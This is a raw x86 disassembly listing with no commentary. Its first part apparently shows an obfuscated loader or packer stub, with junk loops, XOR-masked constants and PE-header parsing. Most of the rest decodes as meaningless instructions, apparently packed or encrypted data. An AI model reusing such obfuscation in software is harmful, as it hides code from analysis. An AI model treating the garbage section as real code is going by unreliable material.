  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	test   al,0xa
  402ab6:	xchg   ebx,eax
  402ab7:	into   
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	xor    ah,BYTE PTR [esp+ebp*2+0x6c]
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x2b1144f2]
  402b65:	rol    ah,cl
  402b67:	test   al,0xa2
  402b69:	test   esi,ebp
  402b6b:	sub    eax,0x8bd04fd1
  402b70:	mov    ebp,0xc652096
  402b75:	push   ecx
  402b76:	int3   
  402b77:	cmp    cl,BYTE PTR [ebx+eax*4]
  402b7a:	xchg   esp,eax
  402b7b:	push   esi
  402b7c:	fisubr DWORD PTR [esi+ebp*2+0x14]
  402b80:	pop    ecx
  402b81:	sub    dh,ah
  402b83:	inc    edi
  402b84:	cmp    DWORD PTR [edx+0x358003dc],ebx
  402b8a:	inc    esp
  402b8b:	rcl    BYTE PTR [edx+0x3ebb1a64],1
  402b91:	test   DWORD PTR [edx],0x31d0a07c
  402b97:	pop    esi
  402b98:	pop    eax
  402b99:	outs   dx,DWORD PTR ds:[esi]
  402b9a:	stos   DWORD PTR es:[edi],eax
  402b9b:	mov    bh,0xe2
  402b9d:	add    DWORD PTR [edx+0x69],0x65
  402ba1:	jno    0x402ba0
  402ba3:	in     al,0x15
  402ba5:	mov    BYTE PTR [esp+edi*4-0x3e1866fa],al
  402bac:	fwait
  402bad:	and    DWORD PTR [esi-0x3e8478eb],esp
  402bb3:	icebp  
  402bb4:	enter  0x9030,0x95
  402bb8:	or     al,bh
  402bba:	inc    edi
  402bbb:	sbb    ch,BYTE PTR [edi-0x68]
  402bbe:	into   
  402bbf:	inc    eax
  402bc0:	sub    cl,BYTE PTR [edx-0x47]
  402bc3:	xchg   ebp,eax
  402bc4:	push   cs
  402bc5:	xor    al,BYTE PTR [edi+eiz*1+0x3c18ebc6]
  402bcc:	cli    
  402bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bce:	xchg   edi,eax
  402bcf:	cmp    BYTE PTR [ebx-0x5087e86a],bl
  402bd5:	(bad)  
  402bd6:	call   0xe968:0xa5fa2f6d
  402bdd:	or     DWORD PTR [esi+0x66],0x23
  402be1:	enter  0x2543,0x2d
  402be5:	add    esi,edi
  402be7:	loop   0x402bb5
  402be9:	pushf  
  402bea:	push   DWORD PTR [ebx+edx*8]
  402bed:	sbb    edx,edi
  402bef:	cmc    
  402bf0:	push   ebx
  402bf1:	cmp    BYTE PTR [edi-0x60],dl
  402bf4:	dec    ebp
  402bf5:	call   0xf97a:0x87db1165
  402bfc:	sbb    ch,dh
  402bfe:	push   es
  402bff:	icebp  
  402c00:	fchs   
  402c02:	and    BYTE PTR [ebp+0x47],dh
  402c05:	xor    BYTE PTR [eax+0x28],ch
  402c08:	int    0xbd
  402c0a:	je     0x402be6
  402c0c:	adc    al,0x3e
  402c0e:	imul   edi,eax,0x1c
  402c11:	or     eax,DWORD PTR [eax-0x2b]
  402c14:	and    eax,0x1bda75e4
  402c19:	pop    esp
  402c1a:	repz (bad) 
  402c1c:	gs cs cs lahf 
  402c20:	outs   dx,BYTE PTR ds:[esi]
  402c21:	fnop   
  402c23:	aad    0x68
  402c25:	imul   ebx,DWORD PTR es:[edx],0xfea848c1
  402c2c:	push   esi
  402c2d:	iret   
  402c2e:	or     eax,0xa447dd8
  402c33:	mov    ch,BYTE PTR [ebx-0x77]
  402c36:	pop    esp
  402c37:	shr    dl,0x21
  402c3a:	test   eax,0xd785aae5
  402c3f:	pop    edi
  402c40:	and    eax,0x8dee3d17
  402c45:	xor    bl,BYTE PTR gs:[ebp+ebp*1-0x3b22626]
  402c4d:	push   ss
  402c4e:	(bad)  
  402c50:	stc    
  402c51:	sub    dl,BYTE PTR [ebp+0x12]
  402c54:	mov    DWORD PTR [ecx+0xe],0xbadb8a5c
  402c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c5c:	cmp    ah,BYTE PTR [ebp-0x3007a7de]
  402c62:	cli    
  402c63:	mov    al,0xed
  402c65:	call   0x43a5e077
  402c6a:	cmp    eax,0xf6e42283
  402c6f:	xchg   esi,eax
  402c70:	fcom   st(6)
  402c72:	aad    0x26
  402c74:	jo     0x402c58
  402c76:	and    eax,0x302f3094
  402c7b:	inc    esp
  402c7c:	pop    edi
  402c7d:	xchg   edi,eax
  402c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c7f:	popa   
  402c80:	clc    
  402c81:	inc    ebp
  402c82:	inc    esi
  402c83:	and    dl,0xf
  402c86:	sbb    BYTE PTR ds:0xd6707d3e,bl
  402c8c:	push   ecx
  402c8d:	lds    esp,FWORD PTR [edi-0x64a81774]
  402c93:	add    ebx,DWORD PTR [ebp+0x4347d615]
  402c99:	sbb    bh,ch
  402c9b:	push   edi
  402c9c:	(bad)  
  402c9d:	ror    BYTE PTR [ebp+0x3f9f9c71],cl
  402ca3:	push   ecx
  402ca4:	push   esp
  402ca5:	rol    al,cl
  402ca7:	push   eax
  402ca8:	jnp    0x402ca7
  402caa:	stos   BYTE PTR es:[edi],al
  402cab:	xchg   esi,eax
  402cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cad:	scas   eax,DWORD PTR es:[edi]
  402cae:	setge  BYTE PTR [edx*2+0x6c3e3835]
  402cb6:	pop    ebx
  402cb7:	pop    ecx
  402cb8:	pop    edx
  402cb9:	lea    ebx,[edi-0x75c16296]
  402cbf:	add    edx,ebx
  402cc1:	pop    ss
  402cc2:	mov    ebp,0xa83d50da
  402cc7:	xor    DWORD PTR [edx-0x47935f95],0x9d699a2c
  402cd1:	pop    esp
  402cd2:	sbb    eax,DWORD PTR [ebx+0x483a5b80]
  402cd8:	sub    al,0x2
  402cda:	add    al,0x5
  402cdc:	cmp    DWORD PTR [ebx],edx
  402cde:	ins    BYTE PTR es:[edi],dx
  402cdf:	retf   0x3ce1
  402ce2:	ja     0x402c70
  402ce4:	loop   0x402d1f
  402ce6:	(bad)  
  402ce7:	adc    al,0x58
  402ce9:	add    ah,BYTE PTR [ebx-0x31]
  402cec:	mov    bl,0xd1
  402cee:	add    ecx,DWORD PTR [edx-0x1f]
  402cf1:	cld    
  402cf2:	lahf   
  402cf3:	retf   
  402cf4:	add    BYTE PTR [edi-0x47c0fbea],al
  402cfa:	(bad)  
  402cfb:	jmp    0x993:0xbb8586cd
  402d02:	mov    DWORD PTR [ebx+0x5e],ecx
  402d05:	xchg   edi,eax
  402d06:	mov    WORD PTR [edi+0x5ea52a98],ss
  402d0c:	cmp    BYTE PTR [edi+0x2751d9c],dh
  402d12:	jae    0x402d6f
  402d14:	push   ss
  402d15:	arpl   ax,dx
  402d17:	xchg   ebx,eax
  402d18:	add    al,0x4c
  402d1a:	aaa    
  402d1b:	lea    edx,[eax-0x24]
  402d1e:	pop    ds
  402d1f:	aad    0xa6
  402d21:	cmp    eax,DWORD PTR [ebx]
  402d23:	popa   
  402d24:	loop   0x402caf
  402d26:	std    
  402d27:	dec    eax
  402d28:	scas   al,BYTE PTR es:[edi]
  402d29:	sbb    al,0xe7
  402d2b:	jae    0x402cf4
  402d2d:	jne    0x402d32
  402d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d31:	mov    ch,0xfb
  402d33:	mov    ch,0x2f
  402d35:	sub    al,0x97
  402d37:	sub    BYTE PTR [edx],ah
  402d39:	pop    edx
  402d3a:	lahf   
  402d3b:	pusha  
  402d3c:	repnz nop
  402d3e:	inc    ebx
  402d3f:	out    0x5a,al
  402d41:	aaa    
  402d42:	or     eax,0x1e63d2c9
  402d47:	pop    edx
  402d48:	dec    esi
  402d49:	test   eax,0x872326f6
  402d4e:	mov    dh,0x30
  402d50:	cmp    DWORD PTR [edi],ebx
  402d52:	jnp    0x402d89
  402d54:	clc    
  402d55:	clc    
  402d56:	xchg   al,al
  402d58:	cmc    
  402d59:	pop    ds
  402d5a:	ja     0x402cde
  402d5c:	cmc    
  402d5d:	dec    eax
  402d5e:	mov    WORD PTR [ebp-0x709f43d1],ds
  402d64:	cmp    al,0x62
  402d66:	mov    eax,ds:0xd6682d9c
  402d6b:	mov    ebx,0x255ab9da
  402d70:	push   esi
  402d71:	and    BYTE PTR [ecx-0x40712f9f],0xb7
  402d78:	stos   BYTE PTR es:[edi],al
  402d79:	inc    esp
  402d7a:	inc    edi
  402d7b:	push   0x78
  402d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7e:	push   ecx
  402d7f:	push   0xb
  402d81:	mov    ds:0xc3fab6c5,eax
  402d86:	fdivp  st(1),st
  402d88:	push   ecx
  402d89:	test   BYTE PTR [ebx+0x715d53fe],dh
  402d8f:	nop
  402d90:	int    0x40
  402d92:	imul   ebp,DWORD PTR cs:[esi-0x10],0x10c1f256
  402d9a:	jns    0x402dc3
  402d9c:	and    esi,esp
  402d9e:	aas    
  402d9f:	pop    ds
  402da0:	adc    DWORD PTR [ecx],edi
  402da2:	adc    BYTE PTR [ebx+ebp*1-0x51],cl
  402da6:	packsswb mm6,QWORD PTR [ecx+0x1d]
  402daa:	push   cs
  402dab:	js     0x402da2
  402dad:	mov    ecx,0xab34c4bf
  402db2:	sub    ch,bl
  402db4:	inc    edx
  402db5:	pop    esi
  402db6:	mov    ecx,0x6a991762
  402dbb:	lahf   
  402dbc:	xchg   ecx,eax
  402dbd:	add    eax,0x163e5021
  402dc2:	inc    ebp
  402dc3:	test   BYTE PTR [ebx+0x36],dl
  402dc6:	mov    al,bh
  402dc8:	imul   ebp,DWORD PTR [ecx+edi*8],0xffffffa9
  402dcc:	lds    edi,FWORD PTR [ecx]
  402dce:	push   esp
  402dcf:	and    eax,0x1a3032c
  402dd4:	mov    ds:0xb6c4052d,al
  402dd9:	or     al,0x3f
  402ddb:	xchg   bl,bl
  402ddd:	jne    0x402e1d
  402ddf:	mov    ?,WORD PTR [edi+0x552a0d55]
  402de5:	sbb    BYTE PTR [ebx+0x57],al
  402de8:	dec    eax
  402de9:	jae    0x402e53
  402deb:	fs sbb bh,BYTE PTR gs:[eax-0x3d]
  402df0:	or     al,0x54
  402df2:	xchg   cl,al
  402df4:	dec    esp
  402df5:	cmp    eax,edi
  402df7:	inc    ecx
  402df8:	ret    
  402df9:	sub    DWORD PTR [ebx+ebx*4-0x3dec6d34],esi
  402e00:	hlt    
  402e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e02:	xor    cl,BYTE PTR [eax]
  402e04:	mov    dh,0x87
  402e06:	mov    edx,0x9d88c2e3
  402e0b:	xor    BYTE PTR [ebx-0x7e],ah
  402e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e0f:	jl     0x402d9b
  402e11:	dec    esp
  402e12:	add    bh,BYTE PTR [ebp+0x72]
  402e15:	mov    eax,ds:0xe80a2650
  402e1a:	xor    DWORD PTR [eax+0x570b4f87],esi
  402e20:	push   es
  402e21:	push   es
  402e22:	fcomp  QWORD PTR [edx-0x5e5b1b95]
  402e28:	mov    edx,0x928b981
  402e2d:	push   ecx
  402e2e:	sbb    eax,0xa61cb604
  402e33:	mov    cl,0xd1
  402e35:	std    
  402e36:	mov    edi,0x76d8c582
  402e3b:	pop    es
  402e3c:	add    BYTE PTR [esi],0x1c
  402e3f:	jb     0x402dd5
  402e41:	sub    BYTE PTR [eax],0x60
  402e44:	je     0x402ea7
  402e46:	int3   
  402e47:	ss xor eax,0xe66b84a9
  402e4d:	cwde   
  402e4e:	je     0x402ebc
  402e50:	dec    ebx
  402e51:	jae    0x402de5
  402e53:	popa   
  402e54:	and    eax,0xe9b9a5b8
  402e59:	data16 in al,dx
  402e5b:	xor    BYTE PTR [edx+edi*1],dl
  402e5e:	hlt    
  402e5f:	(bad)  
  402e60:	out    dx,eax
  402e61:	je     0x402dea
  402e63:	mov    eax,0xad15682d
  402e68:	daa    
  402e69:	imul   ecx,esi,0x13
  402e6c:	sub    DWORD PTR [eax],edx
  402e6e:	xchg   ebx,eax
  402e6f:	xor    dh,BYTE PTR [edi]
  402e71:	retf   
  402e72:	adc    eax,0x7cbbf01d
  402e77:	lahf   
  402e78:	or     BYTE PTR [eax+0x4e7f845],bl
  402e7e:	push   esi
  402e7f:	push   ebp
  402e80:	out    dx,eax
  402e81:	rcl    BYTE PTR [bp-0x35a7],0x4b
  402e87:	jecxz  0x402eb7
  402e89:	shr    DWORD PTR [esi+esi*2-0x36],0xf3
  402e8e:	mov    ecx,0x7f607f61
  402e93:	dec    ecx
  402e94:	repz sar DWORD PTR [edi],cl
  402e97:	scas   eax,DWORD PTR es:[edi]
  402e98:	aaa    
  402e99:	fprem  
  402e9b:	adc    BYTE PTR [ebx-0xfe8490e],bh
  402ea1:	sbb    eax,0x68197f9a
  402ea6:	ret    
  402ea7:	ret    0x6313
  402eaa:	mov    esi,0xd3bafd74
  402eaf:	test   al,0xb5
  402eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eb2:	rol    dh,0xcc
  402eb5:	jo     0x402ee9
  402eb7:	arpl   WORD PTR [ebp-0x5c50acd3],sp
  402ebd:	pop    esi
  402ebe:	adc    al,0x41
  402ec0:	push   ds
  402ec1:	sbb    edx,esp
  402ec3:	push   es
  402ec4:	ret    0x2172
  402ec7:	repnz in eax,dx
  402ec9:	inc    edi
  402eca:	test   DWORD PTR [edx+0x6e],edx
  402ecd:	or     bl,0xc7
  402ed0:	mov    eax,0xc63401f7
  402ed5:	outs   dx,BYTE PTR ds:[esi]
  402ed6:	pop    esi
  402ed7:	mov    eax,ds:0x9921151
  402edc:	adc    DWORD PTR [esi],ebx
  402ede:	push   eax
  402edf:	sub    ah,BYTE PTR [esi]
  402ee1:	sbb    bh,BYTE PTR [eax+ebp*1+0x5b4b8be2]
  402ee8:	dec    esi
  402ee9:	adc    ah,BYTE PTR [ecx+ebx*4]
  402eec:	sbb    dh,BYTE PTR [ebx]
  402eee:	loope  0x402e78
  402ef0:	test   BYTE PTR [eax-0x7ecf4d4e],0x5
  402ef7:	add    bl,BYTE PTR fs:[edi]
  402efa:	icebp  
  402efb:	aas    
  402efc:	in     al,dx
  402efd:	jo     0x402f65
  402eff:	leave  
  402f00:	push   0x8d036a67
  402f05:	pop    esi
  402f06:	mov    cl,bl
  402f08:	aam    0x4b
  402f0a:	jbe    0x402ee4
  402f0c:	repz mov ds:0x3a9636db,al
  402f12:	repnz sbb eax,0x729195e3
  402f18:	adc    BYTE PTR [ecx-0x4f1eceed],0x39
  402f1f:	jnp    0x402f9c
  402f21:	iret   
  402f22:	pop    ds
  402f23:	jo     0x402f7f
  402f25:	popf   
  402f26:	hlt    
  402f27:	not    DWORD PTR [ecx]
  402f29:	push   sp
  402f2b:	cli    
  402f2c:	inc    ebx
  402f2d:	dec    edx
  402f2e:	mov    DWORD PTR [ebx+edi*2],ebx
  402f31:	xchg   edx,eax
  402f32:	or     al,0x38
  402f34:	aaa    
  402f35:	jge    0x402fad
  402f37:	cmp    DWORD PTR [esi-0x2d],ebp
  402f3a:	pop    es
  402f3b:	cmp    DWORD PTR [ebx-0x59],ebx
  402f3e:	mov    edi,0x446c29ae
  402f43:	push   edx
  402f44:	stos   BYTE PTR es:[edi],al
  402f45:	xor    cl,BYTE PTR [ebx+0x49]
  402f48:	out    dx,eax
  402f49:	push   0xbff1a5b0
  402f4e:	add    BYTE PTR [esi+0x74],0xd4
  402f52:	or     al,bh
  402f54:	sub    al,0xa3
  402f56:	mov    esi,0x9d6696c4
  402f5b:	xor    DWORD PTR [esi+0x6dabfa3f],0xc7c9d7cd
  402f65:	inc    edx
  402f66:	int    0xb8
  402f68:	mov    al,0x52
  402f6a:	fisub  DWORD PTR [ebp+eiz*8+0x46]
  402f6e:	push   edi
  402f6f:	stos   BYTE PTR es:[edi],al
  402f70:	jge    0x402f6d
  402f72:	xchg   ebp,eax
  402f73:	pop    edi
  402f74:	inc    ebp
  402f75:	je     0x402f02
  402f77:	inc    edi
  402f78:	lods   al,BYTE PTR ds:[esi]
  402f79:	add    DWORD PTR [edx+0x65],edi
  402f7c:	jae    0x402fcf
  402f7e:	fs daa 
  402f80:	xorps  xmm7,XMMWORD PTR [ecx+0x46]
  402f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f85:	lock pop esp
  402f87:	gs das 
  402f89:	(bad)  
  402f8a:	int3   
  402f8b:	xchg   ebx,eax
  402f8c:	(bad)  [eax-0x79]
  402f8f:	call   0x5945:0x80e0feb4
  402f96:	or     al,0x64
  402f98:	push   ecx
  402f99:	pushf  
  402f9a:	jmp    0x5d502be7
  402f9f:	aas    
  402fa0:	and    eax,0x6f9fd37a
  402fa5:	ins    BYTE PTR es:[edi],dx
  402fa6:	and    DWORD PTR [edx+0x7a392cee],esi
  402fac:	lods   eax,DWORD PTR ds:[esi]
  402fad:	sbb    edx,DWORD PTR [ecx]
  402faf:	or     DWORD PTR [esi-0x2b],esp
  402fb2:	cmp    eax,0x14
  402fb5:	pop    ecx
  402fb6:	push   cs
  402fb7:	xchg   esi,eax
  402fb8:	test   DWORD PTR [edx-0x4e],0x94d7a3f7
  402fbf:	mov    ebp,0x6fe81cd9
  402fc4:	adc    dl,BYTE PTR [ecx-0x7f2c1c52]
  402fca:	sub    BYTE PTR [ecx-0x4d5aa75],ah
  402fd0:	cmp    eax,0x9facef37
  402fd5:	sbb    edi,edx
  402fd7:	lea    ecx,[ebx+0x12f3050]
  402fdd:	adc    ah,al
  402fdf:	fnstcw WORD PTR [esi+0x6]
  402fe2:	cli    
  402fe3:	add    eax,0xae32cfdd
  402fe8:	sub    al,0x76
  402fea:	stc    
  402feb:	sbb    DWORD PTR [ebx],esp
  402fed:	in     eax,0xaa
  402fef:	fcmovnbe st,st(2)
  402ff1:	pop    edi
  402ff2:	outs   dx,BYTE PTR ds:[esi]
  402ff3:	or     al,0xa2
  402ff5:	je     0x403076
  402ff7:	and    DWORD PTR [esi],ebp
  402ff9:	fbstp  TBYTE PTR [ebx+ebp*4-0x78]
  402ffd:	test   ch,0x38
  403000:	jmp    0x575afe3d
  403005:	inc    ebx
  403006:	xchg   DWORD PTR [edx+eax*1],eax
  403009:	mov    ch,0xe8
  40300b:	xlat   BYTE PTR ds:[ebx]
  40300c:	push   0x1d
  40300e:	mov    edx,0xbc05a72
  403013:	fwait
  403014:	pop    esp
  403015:	lahf   
  403016:	and    DWORD PTR [eax+0x64],edx
  403019:	aas    
  40301a:	xor    eax,0xaabf9436
  40301f:	pop    ecx
  403020:	inc    esp
  403021:	and    ecx,edi
  403023:	add    edx,DWORD PTR [ebp-0x8d6a521]
  403029:	into   
  40302a:	arpl   WORD PTR [ebx-0x3f46fd49],bp
  403030:	je     0x403010
  403032:	cli    
  403033:	cmp    ebx,edi
  403035:	in     eax,0xea
  403037:	clc    
  403038:	aad    0x35
  40303a:	mov    ?,WORD PTR [ecx+0x512d7fef]
  403040:	lods   eax,DWORD PTR ds:[esi]
  403041:	dec    edx
  403042:	dec    esp
  403043:	leave  
  403044:	sbb    ebx,esi
  403046:	lahf   
  403047:	call   0x49e5:0x90683a3
  40304e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40304f:	not    DWORD PTR [ecx+0x5]
  403052:	xchg   edx,eax
  403053:	jae    0x403098
  403055:	jl     0x4030bb
  403057:	inc    edx
  403058:	rcl    BYTE PTR [esp+ebp*4],1
  40305b:	sti    
  40305c:	jg     0x40309b
  40305e:	mov    dh,0x41
  403060:	adc    eax,0x87acc87c
  403065:	jns    0x403085
  403067:	mov    dh,0x37
  403069:	jb     0x4030ae
  40306b:	jno    0x403071
  40306d:	pop    ds
  40306e:	sar    bh,1
  403070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403071:	ror    DWORD PTR [edi-0x350efc86],0x0
  403078:	push   ecx
  403079:	dec    edi
  40307a:	mov    ebx,ecx
  40307c:	inc    eax
  40307d:	jbe    0x4030a8
  40307f:	inc    eax
  403080:	mov    esp,0x95275439
  403085:	in     al,0x61
  403087:	aad    0x4d
  403089:	pop    ecx
  40308a:	test   al,0x9
  40308c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40308d:	push   edi
  40308e:	iret   
  40308f:	sbb    bl,BYTE PTR [esi+0x114a8d63]
  403095:	jb     0x40302f
  403097:	nop
  403098:	push   cs
  403099:	scas   al,BYTE PTR es:[edi]
  40309a:	add    esp,DWORD PTR ds:0x56b147b4
  4030a0:	(bad)  
  4030a1:	aad    0x67
  4030a3:	or     al,0xf
  4030a5:	pop    edi
  4030a6:	shr    al,cl
  4030a8:	push   ecx
  4030a9:	adc    al,BYTE PTR [ebx]
  4030ab:	es inc esi
  4030ad:	cmp    BYTE PTR [edi],dl
  4030af:	(bad)  
  4030b0:	in     eax,dx
  4030b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030b2:	jge    0x4030ff
  4030b4:	fld    QWORD PTR [esi-0xc]
  4030b7:	pop    esi
  4030b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030b9:	and    DWORD PTR [ebx-0x7a6fe326],eax
  4030bf:	(bad)  
  4030c0:	mov    bl,0xe5
  4030c2:	aad    0xbc
  4030c4:	push   ebx
  4030c5:	mov    gs,WORD PTR [esi+0x5f]
  4030c8:	mov    edx,DWORD PTR [eax]
  4030ca:	call   ebp
  4030cc:	pop    ebp
  4030cd:	fcomp  DWORD PTR [ebx-0x6b8297bc]
  4030d3:	xchg   edx,eax
  4030d4:	rol    cl,cl
  4030d6:	ss push esi
  4030d8:	mov    ecx,DWORD PTR [ecx]
  4030da:	lds    esi,FWORD PTR [edx-0x7e]
  4030dd:	cwde   
  4030de:	dec    esp
  4030df:	pop    esi
  4030e0:	fwait
  4030e1:	and    DWORD PTR [ebp-0x50],0xffffffb1
  4030e5:	pop    edx
  4030e6:	(bad)
  4030ea:	inc    ebx
  4030eb:	cmp    ecx,DWORD PTR [ecx-0x7b32aa6]
  4030f1:	pop    ss
  4030f2:	lds    ebx,FWORD PTR [edx+ebx*2]
  4030f5:	aaa    
  4030f6:	pop    eax
  4030f7:	jbe    0x4030bc
  4030f9:	cld    
